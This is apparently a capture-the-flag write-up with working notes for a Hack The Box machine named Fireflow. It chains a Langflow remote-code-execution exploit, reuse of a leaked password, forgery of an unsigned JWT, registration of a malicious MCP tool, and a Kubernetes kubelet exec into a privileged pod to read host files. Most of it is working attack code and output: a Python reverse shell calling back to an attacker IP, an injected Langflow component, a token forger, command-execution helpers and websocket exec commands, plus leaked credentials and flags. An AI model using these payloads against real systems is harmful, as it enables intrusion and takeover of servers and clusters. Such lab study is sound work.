# Fireflow

sudo nmap -sCV 10.129.244.214
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-09-10 13:58 EDT
Nmap scan report for 10.129.244.214
Host is up (0.014s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp   open     ssl/http  nginx
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to [https://fireflow.htb/](https://fireflow.htb/)
9100/tcp  filtered jetdirect
30000/tcp filtered ndmps
30718/tcp filtered unknown
30951/tcp filtered unknown
31038/tcp filtered unknown
31337/tcp filtered Elite

sudo nmap -p- -T5 10.129.244.214
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-09-10 13:58 EDT
Nmap scan report for 10.129.244.214
Host is up (0.014s latency).
Not shown: 62762 closed tcp ports (reset), 2771 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 15.83 seconds

gobuster vhost -k -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil.txt -u [https://fireflow.htb](https://fireflow.htb/) --append-domain

Found: flow.fireflow.htb Status: 200 [Size: 1142]

cant sign in without admin approval

CVE-2026-33017

```
python exploit.py --url https://flow.fireflow.htb --flow-id 7d84d636-af65-42e4-ac38-26e867052c25 --lhost 10.10.14.80 --lport 4444 --listen
[*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
[*] Callback: 10.10.14.80:4444
[*] Listening on 0.0.0.0:4444...
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'flow.fireflow.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(

[!] SHELL ESTABLISHED FROM 10.129.244.214:46760

bash: cannot set terminal process group (1525): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fireflow:/var/lib/langflow$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@fireflow:/var/lib/langflow$ 
www-data@fireflow:/dev/shm$ ls /home
nightfall
```

LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll

ssh nightfall@fireflow.htb

```
nightfall@fireflow:~$ ls
user.txt
nightfall@fireflow:~$ cat user.txt
855f9c6436e36fd9c63f3f58b8c57e86

nightfall@fireflow:~/.mcp$ cat config.json
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}

ss -tunlp
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
udp    UNCONN  0       0           127.0.0.54:53           0.0.0.0:*            
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*            
udp    UNCONN  0       0              0.0.0.0:68           0.0.0.0:*            
udp    UNCONN  0       0              0.0.0.0:8472         0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:10010        0.0.0.0:*            
tcp    LISTEN  0       2048         127.0.0.1:7860         0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       4096        127.0.0.54:53           0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:36049        0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:6444         0.0.0.0:*            
tcp    LISTEN  0       4096           0.0.0.0:22           0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:443          0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:10249        0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:10248        0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:10259        0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:10258        0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:10257        0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:10256        0.0.0.0:*            
tcp    LISTEN  0       4096                 *:9100               *:*            
tcp    LISTEN  0       4096              [::]:22              [::]:*            
tcp    LISTEN  0       4096                 *:10250              *:*            
tcp    LISTEN  0       4096                 *:6443               *:*     

nightfall@fireflow:/var/run$ B=http://127.0.0.1:30080
nightfall@fireflow:/var/run$ curl -s $B/api/v1/version; echo
{"service":"MCP AI Tool Registry","version":"0.1.0","auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]},"docs":"/docs","endpoints":["POST /mcp                        [MCP JSON-RPC 2.0]","POST /api/v1/auth","GET  /api/v1/tools","POST /api/v1/tools               [admin]"]}
nightfall@fireflow:/var/run$ curl -s -u 'langflow-bot:Langfl0w@mcp2026!' $B/api/v1/version; echo
{"service":"MCP AI Tool Registry","version":"0.1.0","auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]},"docs":"/docs","endpoints":["POST /mcp                        [MCP JSON-RPC 2.0]","POST /api/v1/auth","GET  /api/v1/tools","POST /api/v1/tools               [admin]"]}

nightfall@fireflow:/dev/shm$ TOKEN=$(curl -s -X POST $B/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}')
nightfall@fireflow:/dev/shm$ echo "$TOKEN"
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}

cat forge.py 
#!/usr/bin/env python3
# CVE-style JWT alg:none forge for the MCP AI Tool Registry.
# Usage: python3 forge.py <langflow-bot-JWT>
# Prints an alg:none token with common admin claims elevated.
import sys, base64, json

def b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def main() -> None:
    if len(sys.argv) != 2:
        print("usage: python3 forge.py <JWT>", file=sys.stderr)
        sys.exit(1)

    jwt = sys.argv[1].strip()
    try:
        h, p, _ = jwt.split(".")
    except ValueError:
        print("[-] not a valid 3-part JWT", file=sys.stderr)
        sys.exit(1)

    payload = json.loads(base64.urlsafe_b64decode(p + "==" * (-len(p) % 4)))

    # Elevate any privilege claim that already exists in the token...
    elevated = {
        "role": "admin", "is_admin": True, "admin": True,
        "scope": "admin", "user": "admin", "username": "admin", "sub": "admin",
    }
    payload.update({k: v for k, v in elevated.items() if k in payload})
    # ...and add the common ones if the token didn't carry them.
    for k, v in {"role": "admin", "is_admin": True, "admin": True}.items():
        payload.setdefault(k, v)

    header = {"alg": "none", "typ": "JWT"}
    token = f'{b64u(json.dumps(header).encode())}.{b64u(json.dumps(payload).encode())}.'
    print(token)

if __name__ == "__main__":
    main()

nightfall@fireflow:/dev/shm$ ADMIN=$(python3 /dev/shm/forge.py "$JWT"); echo "$ADMIN"
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJhZG1pbiIsICJpc19hZG1pbiI6IHRydWUsICJhZG1pbiI6IHRydWV9.
nightfall@fireflow:/dev/shm$ curl -s $B/api/v1/tools -H "Authorization: Bearer $ADMIN"; echo
[{"name":"ping_host","description":"Ping a target host 3 times and return ICMP output."},{"name":"get_metrics_summary","description":"Return a summary of system memory and load average from /proc."},{"name":"list_running_tasks","description":"List the top 20 running processes sorted by CPU usage."}]
nightfall@fireflow:/dev/shm$ curl -s $B/docs -o /tmp/docs.html; grep -iEo '"[a-z_]+"' /tmp/docs.html | sort -u | head -40
"BaseLayout"
"deepLinking"
"dom_id"
"layout"
"showCommonExtensions"
"showExtensions"
"stylesheet"
"viewport"

curl -s -X POST $B/mcp -H "Authorization: Bearer $ADMIN" -H 'Content-Type: application/json' -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}' | python3 -m json.tool
{
    "jsonrpc": "2.0",
    "id": 1,
    "result": {
        "tools": [
            {
                "name": "ping_host",
                "description": "Ping a target host 3 times and return ICMP output.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "target": {
                            "type": "string",
                            "description": "IP address or hostname to ping"
                        }
                    },
                    "required": [
                        "target"
                    ]
                }
            },
            {
                "name": "get_metrics_summary",
                "description": "Return a summary of system memory and load average from /proc.",
                "inputSchema": {
                    "type": "object",
                    "properties": {}
                }
            },
            {
                "name": "list_running_tasks",
                "description": "List the top 20 running processes sorted by CPU usage.",
                "inputSchema": {
                    "type": "object",
                    "properties": {}
                }
            }
        ]
    }
}

```

```
nightfall@fireflow:/dev/shm$ cat call.sh
#!/usr/bin/env bash
# Run an arbitrary command through the already-registered "pwn" tool.
# Usage: ./call.sh 'ls -la /root; cat /root/root.txt'
# Requires $B and $ADMIN in the env.
set -euo pipefail

B="${B:-http://127.0.0.1:30080}"
: "${ADMIN:?set ADMIN to the forged admin JWT first}"
CMD="${1:-id; hostname; whoami}"

body="$(python3 -c 'import json,sys;print(json.dumps({"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"pwn","arguments":{"cmd":sys.argv[1]}}}))' "$CMD")"

curl -s -X POST "$B/mcp" -H "Authorization: Bearer $ADMIN" \
    -H 'Content-Type: application/json' -d "$body"; echo
nightfall@fireflow:/dev/shm$ cat register_tool.sh 
#!/usr/bin/env bash
# Register the "pwn" tool on the MCP registry, then invoke it once.
# Requires: $B (base URL) and $ADMIN (forged alg:none admin JWT) in the env,
# and tool.py sitting next to this script.
set -euo pipefail

B="${B:-http://127.0.0.1:30080}"
: "${ADMIN:?set ADMIN to the forged admin JWT first}"
DIR="$(cd "$(dirname "$0")" && pwd)"

# Build the registration body (python handles JSON escaping of the code).
python3 - "$DIR/tool.py" > "$DIR/reg.json" <<'PYEOF'
import json, sys
print(json.dumps({
    "name": "pwn",
    "description": "diag",
    "inputSchema": {"type": "object", "properties": {"cmd": {"type": "string"}}},
    "code": open(sys.argv[1]).read(),
}))
PYEOF

echo "[*] Registering tool..."
curl -s -X POST "$B/api/v1/tools" -H "Authorization: Bearer $ADMIN" \
    -H 'Content-Type: application/json' --data @"$DIR/reg.json"; echo

echo "[*] Invoking (id; hostname; whoami)..."
curl -s -X POST "$B/mcp" -H "Authorization: Bearer $ADMIN" -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"pwn","arguments":{"cmd":"id; hostname; whoami"}}}'; echo
nightfall@fireflow:/dev/shm$ cat tool.py 
import subprocess
# The framework captures STDOUT of this code. Find the command from whatever
# name it injected the invoke arguments under; fall back to recon default.
_cmd = None
for _n in ('cmd', 'target', 'command', 'input'):
    if _n in globals() and isinstance(globals()[_n], str):
        _cmd = globals()[_n]
        break
if _cmd is None:
    for _d in ('args', 'arguments', 'params', 'kwargs', 'inputs'):
        _g = globals().get(_d)
        if isinstance(_g, dict):
            _cmd = _g.get('cmd') or _g.get('target')
            if _cmd:
                break
if not _cmd:
    _cmd = 'id; hostname; whoami'
_r = subprocess.run(['/bin/sh', '-c', _cmd], capture_output=True, text=True)
print((_r.stdout or '') + (_r.stderr or ''), end='')
nightfall@fireflow:/dev/shm$ cat reg
cat: reg: No such file or directory
nightfall@fireflow:/dev/shm$ cat reg.json 
{"name": "pwn", "description": "diag", "inputSchema": {"type": "object", "properties": {"cmd": {"type": "string"}}}, "code": "import subprocess\n# The framework captures STDOUT of this code. Find the command from whatever\n# name it injected the invoke arguments under; fall back to recon default.\n_cmd = None\nfor _n in ('cmd', 'target', 'command', 'input'):\n    if _n in globals() and isinstance(globals()[_n], str):\n        _cmd = globals()[_n]\n        break\nif _cmd is None:\n    for _d in ('args', 'arguments', 'params', 'kwargs', 'inputs'):\n        _g = globals().get(_d)\n        if isinstance(_g, dict):\n            _cmd = _g.get('cmd') or _g.get('target')\n            if _cmd:\n                break\nif not _cmd:\n    _cmd = 'id; hostname; whoami'\n_r = subprocess.run(['/bin/sh', '-c', _cmd], capture_output=True, text=True)\nprint((_r.stdout or '') + (_r.stderr or ''), end='')\n"}

```

```
cat fireflow_progress.md 
# HTB Fireflow — Progress / Handoff Notes

**Box:** fireflow (HTB) · **Target IP:** 10.129.244.214 · **Theme:** Langflow → MCP → Kubernetes
**Status as of last session:** Have `user.txt`. Code execution as `mcp` (uid 1000) inside a k8s pod. Working on pod → node root.

---

## Flags
- **user.txt** (as `nightfall`): `855f9c6436e36fd9c63f3f58b8c57e86`
- **root.txt**: NOT YET — this is the current objective.

---

## Attack chain so far

### 1. Foothold — Langflow RCE (CVE-2026-33017)
- Subdomain `flow.fireflow.htb` runs **Langflow**, vulnerable to unauth code exec via `build_public_tmp`.
- Exploit script: `/home/ronking37/CVE-2026-33017/exploit.py`
- **Gotcha:** don't include `/playground/` in `--url` — that path routes to the UI and returns HTTP 405. Use the site root:
  ```bash
  python exploit.py --url https://flow.fireflow.htb/ \
    --flow-id 7d84d636-af65-42e4-ac38-26e867052c25 \
    --lhost <tun0-ip> --lport 4444 --listen
  ```
  Correct endpoint = `https://flow.fireflow.htb/api/v1/build_public_tmp/<flow-id>/flow?event_delivery=direct&log_builds=false` (returns 200).
- Got a reverse shell, then escalated to **user `nightfall`** (has user.txt).

### 2. Enumeration as nightfall
- **`getcap` / SUID:** nothing useful (ping/mtr/snap-confine/gst-ptp-helper all default; snap-confine caps are `=p` not `=ep`).
- Host is a **kubeadm Kubernetes control-plane NODE**. `ss -tunlp` showed:
  - `6443` (apiserver, all-ifaces), `6444` (secondary apiserver), `10250` (kubelet, all-ifaces),
    `10257/10259` (controller-mgr/scheduler), `10256/10248/10249` (kube-proxy/kubelet),
    `9100` (node_exporter), `30080` (NodePort → MCP server), `7860` (Langflow), `22`, `443`.
- **Key loot:** `~/.mcp/config.json`
  ```json
  { "server": "http://10.129.244.214:30080", "status_endpoint": "/api/v1/version",
    "user": "langflow-bot", "password": "Langfl0w@mcp2026!" }
  ```

### 3. MCP "AI Tool Registry" abuse (port 30080, reach via 127.0.0.1:30080 on the box)
- Service self-describes: JWT auth, **`supported_algorithms: ["HS256","none"]`** (← `alg:none` is the vuln).
- Endpoints: `POST /api/v1/auth`, `GET /api/v1/tools`, `POST /api/v1/tools [admin]`, `POST /mcp` (JSON-RPC 2.0), `/docs`, `/openapi.json`.
- **Login** as langflow-bot → JWT (stored in shell var `$JWT`):
  ```bash
  B=http://127.0.0.1:30080
  JWT=$(curl -s -X POST $B/api/v1/auth -H 'Content-Type: application/json' \
    -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' \
    | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("token") or d.get("access_token") or d.get("jwt"))')
  ```
- **Forge admin token** via `alg:none` (`forge.py`). NOTE: had to match the *exact* privilege claim
  the server checks (decoded the real token to find it) — plain `role:admin` alone got
  `{"detail":"Admin role required"}` until the right claim was set. Final forged token `$ADMIN` works:
  registration returns `{"status":"registered","name":"pwn"}`.
- **Tool registration = code execution.** `ToolRegisterRequest` requires a `code` field (Python).
  Framework **exec's the code and captures STDOUT** (NOT the return value; invoke `arguments` are
  NOT injected into the code — so we base64-embed the command instead).

### 4. Current access
- Registered tool `pwn`; invoking runs shell commands and returns stdout.
- **Identity:** `uid=1000(mcp) gid=1000(mcp)`, pod hostname `mcp-server-54464cb475-29ztf`.
- => We are **`mcp` inside the mcp-server pod**. Need to break out to node root.

---

## Working toolkit (files in /home/ronking37/, copy to box e.g. /dev/shm)
- `forge.py` — JWT alg:none forger. `python3 forge.py "$JWT"` → prints admin token.
- `schema.py` — dumps MCP `/openapi.json` tool schema (`curl -s $B/openapi.json | python3 schema.py`).
- `tool.py` — payload code (top-level, prints stdout).
- `register_tool.sh` — registers `pwn` from tool.py + one invoke.
- `call.sh` — DEPRECATED (arg injection doesn't work on this registry).
- **`run.sh` — USE THIS.** Base64-embeds an arbitrary command, re-registers, invokes, prints text.
  ```bash
  export B=http://127.0.0.1:30080
  export ADMIN='<forged alg:none admin JWT>'
  ./run.sh 'id; hostname'
  ./run.sh 'cat /root/root.txt'   # note: /root is on the POD, not the node — won't have root.txt yet
  ```

### Re-establishing access from scratch (if tokens expired)
1. On box: `B=http://127.0.0.1:30080`
2. Re-login as langflow-bot → `$JWT` (see §3).
3. `python3 forge.py "$JWT"` → `export ADMIN=<output>`.
4. `./register_tool.sh` then use `./run.sh '<cmd>'`.

---

## NEXT STEPS — pod → node root (in progress)

We have RCE in the mcp-server pod. Escalation path = use the pod's k8s **service-account token**
against the apiserver to schedule a **privileged pod that mounts the host `/`** → chroot → node root.

Commands to run (via `./run.sh '...'`):
```bash
# identity + how to reach API
./run.sh 'cat /var/run/secrets/kubernetes.io/serviceaccount/namespace; echo; env | grep -i KUBERNETES; ls -la /var/run/secrets/kubernetes.io/serviceaccount/'
# the token
./run.sh 'cat /var/run/secrets/kubernetes.io/serviceaccount/token; echo'
# DECISIVE: what can this SA do?
./run.sh 'T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); C=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt; A=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT; curl -s --cacert $C -H "Authorization: Bearer $T" -X POST -H "Content-Type: application/json" $A/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"default\"}}"'
```

Decision tree on the `SelfSubjectRulesReview` result:
- **`create pods` allowed** → schedule privileged pod (hostPID, privileged:true, hostPath `/` → /host,
  `nodeName` pinned to this node), then `exec chroot /host` → root on node → `/root/root.txt`.
  Use an image already present on the node (`get pods -A -o jsonpath='{..image}'`) to avoid ErrImagePull (offline lab).
- **`get/list secrets`** → dump secrets, hunt a more privileged SA token, repeat.
- **Otherwise** → look at kubelet `:10250` (may allow exec), or other SA tokens / node creds.

Also worth checking from inside the pod: mounted volumes (`mount`, `ls -la /`), env for extra creds,
whether `hostPath` or docker socket is already mounted.

---

## Open questions / notes for next session
- Confirm the exact privilege claim name in the MCP JWT (documented working `$ADMIN` exists; re-derive if expired).
- `6444` vs `6443` — both apiserver endpoints; from inside pod use `$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT`.
- node_exporter `:9100` and kubelet `:10250` are secondary options if the SA token is weak.
```

```
 rce() {
    local b64=$(printf '%s' "$1" | base64 -w0)
    local code="import subprocess,base64; c=base64.b64decode('$b64').decode();
  r=subprocess.run(['bash','-c',c],capture_output=True,text=True);
  print(r.stdout+r.stderr,end='')"
    python3 -c 'import 
  json,sys;print(json.dumps({"name":"r","description":"r","code":sys.argv[1]}))'
  "$code" > /dev/shm/.r.json
    curl -s -X POST $B/api/v1/tools -H "Authorization: Bearer $ADMIN" -H
  'Content-Type: application/json' -d @/dev/shm/.r.json >/dev/null
    curl -s -X POST $B/mcp -H "Authorization: Bearer $ADMIN" -H 'Content-Type: 
  application/json' \
      -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"r","ar
  guments":{}}}' \
    | python3 -c 'import 
  sys,json;print(json.load(sys.stdin)["result"]["content"][0]["text"],end="")'
  }

  rce 'id; hostname'          
```

```
# HTB — Fireflow — Full Exploitation Report

**Target:** `fireflow.htb` (HTB, medium, Linux)
**IP (instance-specific, changes on reset):** `10.129.60.93`
**Attacker VPN IP (tun0), instance-specific:** `10.10.14.80`
**Theme:** Langflow RCE → password reuse → MCP `alg:none` JWT → k8s `nodes/proxy` → privileged-pod exec → host root

> Flags are regenerated on every reset. Values seen in the solving instance:
> - `user.txt` (nightfall): `af9bc25bdd93de3454e03d0af96e4eb3`
> - `root.txt`: `7dca87f30b4df8f80a3cdca007d70052`

---

## Attack chain at a glance

1. **Foothold** — Langflow **CVE-2026-33017** unauth RCE via the public flow build endpoint → shell as `www-data`.
2. **User** — Langflow `.env` `LANGFLOW_SUPERUSER_PASSWORD` is reused by system user `nightfall` → SSH.
3. **Pivot** — `~nightfall/.mcp/config.json` leaks creds to a custom MCP server (NodePort `30080`, localhost-only).
4. **Pod RCE** — MCP accepts JWT `alg:none`; forge an admin token → register a malicious tool → code exec in the `mcp-server` pod (`mcp` uid 1000).
5. **Pod → host root** — pod SA `mcp-sa` has `get nodes/proxy`. The kubelet registers `/exec` on **GET** (authz verb `get`, *not* `create`), so we exec into the **privileged `node-exporter`** pod (mounts host `/` at `/host/root`) over a WebSocket → read the host filesystem as root.

---

## 0. Setup

```bash
# vhosts (IP changes on reset)
echo '10.129.60.93 fireflow.htb flow.fireflow.htb' | sudo tee -a /etc/hosts

# confirm services (only 22 + 443 exposed externally; k8s/MCP are internal)
for p in 22 443 6443 10250 30080 7860; do
  timeout 3 bash -c "echo > /dev/tcp/10.129.60.93/$p" 2>/dev/null \
    && echo "$p OPEN" || echo "$p closed"
done
```

---

## 1. Foothold — Langflow CVE-2026-33017 (→ www-data)

Langflow ≤1.8.x exposes `POST /api/v1/build_public_tmp/{flow_id}/flow`, which accepts an attacker-supplied `data` graph whose custom-component `code` field is passed to `exec()` — unauthenticated RCE. Needs a valid **public `flow_id`** (leaked) and any `client_id` cookie.

Confirm version + endpoint:
```bash
curl -sk https://flow.fireflow.htb/api/v1/version          # -> {"version":"1.8.2",...}
FID=7d84d636-af65-42e4-ac38-26e867052c25                   # leaked public flow id
CID=$(cat /proc/sys/kernel/random/uuid)
```

Build the malicious flow (the injected component runs arbitrary Python as `www-data`). Example payload that copies the app `.env` somewhere world-readable — swap `r()`'s body for a reverse shell to get interactive access:
```bash
python3 > /tmp/lf_body.json <<'PY'
import json
pycode = (
"from lfx.custom.custom_component.component import Component\n"
"from lfx.io import Output\n"
"from lfx.schema.data import Data\n"
"class ExploitComp(Component):\n"
"    display_name='X'\n"
"    outputs=[Output(display_name='O', name='o', method='r')]\n"
"    def r(self) -> Data:\n"
"        import subprocess\n"
"        r=subprocess.run(['bash','-c','id; cat /etc/langflow/.env'],capture_output=True,text=True)\n"
"        return Data(data={'out': r.stdout+r.stderr})\n"
)
body={"data":{"nodes":[{"id":"Exploit","data":{"id":"Exploit","type":"ExploitComp",
  "node":{"template":{"_type":"Component","code":{"type":"code","value":pycode}},
  "outputs":[{"types":["Data"],"name":"o","method":"r"}]}}}],"edges":[]}}
print(json.dumps(body))
PY

# fire it (endpoint is the site root; do NOT include /playground/)
curl -sk -X POST \
  "https://flow.fireflow.htb/api/v1/build_public_tmp/$FID/flow?event_delivery=direct&log_builds=false" \
  -H 'Content-Type: application/json' -b "client_id=$CID" -d @/tmp/lf_body.json
```

**Reverse-shell variant** for `r()` (catch with `nc -lvnp 4444`):
```python
    def r(self) -> Data:
        import socket,subprocess,os
        s=socket.socket(); s.connect(("10.10.14.80",4444))
        [os.dup2(s.fileno(),f) for f in (0,1,2)]
        subprocess.call(["/bin/bash","-i"])
        return Data(data={"ok":1})
```

---

## 2. www-data → nightfall (password reuse)

`/etc/langflow/.env` (readable by `www-data`) reuses the SSH password of `nightfall`:
```
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll     # == nightfall's SSH password
LANGFLOW_SECRET_KEY=...
```

```bash
sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh -o StrictHostKeyChecking=no nightfall@10.129.60.93
# id -> uid=1000(nightfall); cat user.txt
```

---

## 3. Pivot — MCP server creds

```bash
cat ~/.mcp/config.json
# { "server":"http://10.129.244.214:30080", "user":"langflow-bot",
#   "password":"Langfl0w@mcp2026!" }
# NodePort 30080 is reachable only on the box itself -> run MCP calls over the SSH session.
```

---

## 4. MCP `alg:none` JWT forgery → pod RCE

The MCP server (`main.py`) advertises `supported_algorithms: ["HS256","none"]` and, for `alg:none`, decodes the JWT with `verify_signature: False`. Admin is `role == "admin"`. So forge an unsigned admin token:

```bash
# alg:none admin token = base64url({"alg":"none","typ":"JWT"}).base64url({"sub":"langflow-bot","role":"admin"}).
ADMIN='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.'
B=http://127.0.0.1:30080
```

Tool registration = code exec: `POST /api/v1/tools` stores Python `code`; invoking via `POST /mcp` (`tools/call`) runs `python3 -c <code>` and returns stdout. Invoke `arguments` are piped to the tool's **stdin** (not injected into the code), so embed the command instead.

`run.sh` helper (run **on the box** as nightfall) — registers a tool that base64-decodes and runs any command, then invokes it:
```bash
rce() {
  local b64=$(printf '%s' "$1" | base64 -w0)
  local code="import subprocess,base64; c=base64.b64decode('$b64').decode(); r=subprocess.run(['bash','-c',c],capture_output=True,text=True); print(r.stdout+r.stderr,end='')"
  python3 -c 'import json,sys;print(json.dumps({"name":"r","description":"r","code":sys.argv[1]}))' "$code" > /dev/shm/.r.json
  curl -s -X POST $B/api/v1/tools -H "Authorization: Bearer $ADMIN" -H 'Content-Type: application/json' -d @/dev/shm/.r.json >/dev/null
  curl -s -X POST $B/mcp -H "Authorization: Bearer $ADMIN" -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"r","arguments":{}}}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["result"]["content"][0]["text"],end="")'
}
rce 'id; hostname'      # -> uid=1000(mcp) ... mcp-server-...
```
(The repo's `~/mcp-rce.sh` wraps this end-to-end from the attacker box: `./mcp-rce.sh 'id'`, `-s` pseudo-shell, `-r LHOST LPORT` reverse shell.)

---

## 5. Kubernetes enumeration (from inside the pod)

All commands below are run through `rce '...'` (i.e. as `mcp` in the pod). SA token + CA are at the standard path.

```bash
# identity / API
rce 'cat /var/run/secrets/kubernetes.io/serviceaccount/namespace; echo; env | grep KUBERNETES_SERVICE'
# -> namespace=default ; apiserver = https://10.43.0.1:443

# what can this SA do?  -> ONLY get nodes/proxy (+ selfsubjectreviews)
rce 'T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); C=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s --cacert $C -H "Authorization: Bearer $T" -X POST \
  https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H "Content-Type: application/json" \
  -d "{\"spec\":{\"namespace\":\"default\"}}"'
# resourceRules -> {"verbs":["get"],"resources":["nodes/proxy"]}
```

`get nodes/proxy` lets us read the kubelet. List pods on the node and find the privileged one:
```bash
rce 'T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); C=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl -s --cacert $C -H "Authorization: Bearer $T" \
  https://10.43.0.1:443/api/v1/nodes/fireflow/proxy/pods' > /tmp/pods.json
# -> monitoring/prometheus-prometheus-node-exporter-*  is privileged, hostPID,
#    hostPath / -> /host/root  (runs as root)
```

> Tip: `mcp-sa` can't `list pods`/`namespaces`, but **kube-state-metrics** (in-cluster,
> `http://prometheus-kube-state-metrics.monitoring.svc.cluster.local:8080/metrics`)
> enumerates the whole cluster. (It also reveals a stale second node `ubuntu` that is
> build cruft — NotReady/unreachable — ignore it.)

---

## 6. Pod → host root — GET-based kubelet exec into the privileged pod

**Key insight:** exec/run need the kubelet, and the authz verb is derived from the HTTP method:
`POST → create` (denied), but the kubelet registers `/exec` on **GET** too → `get nodes/proxy` (which we have) authorizes it.

```bash
# POST /run -> 403 create ; GET /exec -> 500 "Upgrade request required" (== authorized, needs WebSocket)
```

`node-exporter` is `FROM scratch` (no shell/cat) but mounts host `/` at `/host/root`, so we run the
**host's** binaries through the host dynamic linker (host binaries are dynamically linked; the container's
`/lib64` is empty). `websocat` is present on the host and speaks the exec WebSocket protocol.

Run these **on the box as nightfall**:
```bash
# mcp-sa token (grab from the pod, or via /proc of the uid-1000 mcp process)
TOK=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)   # <- from inside the pod (rce 'cat ...')
NE=prometheus-prometheus-node-exporter-nmntq                      # live node-exporter pod name
LD=/host/root/lib64/ld-linux-x86-64.so.2
LP=/host/root/lib/x86_64-linux-gnu:/host/root/usr/lib/x86_64-linux-gnu:/host/root/lib64

exec_ws() {  # $1 = url query (command=...&command=...&output=1&error=1)
  local url="wss://127.0.0.1:10250/exec/monitoring/$NE/node-exporter?$1"
  # keep stdin open (sleep) or websocat closes before output streams back
  sleep 6 | timeout 15 websocat -kb \
    -H="Authorization: Bearer $TOK" \
    -H='Sec-WebSocket-Protocol: v4.channel.k8s.io' "$url" 2>/dev/null
}

# confirm we're root in the privileged container
exec_ws "command=$LD&command=--library-path&command=$LP&command=/host/root/usr/bin/id&output=1&error=1" | cat -v
# -> uid=0(root) ...

# READ ROOT FLAG (host / is at /host/root)
exec_ws "command=$LD&command=--library-path&command=$LP&command=/host/root/usr/bin/cat&command=/host/root/root/root.txt&output=1&error=1" | tr -cd '[:print:]\n'
# -> 7dca87f30b4df8f80a3cdca007d70052
```

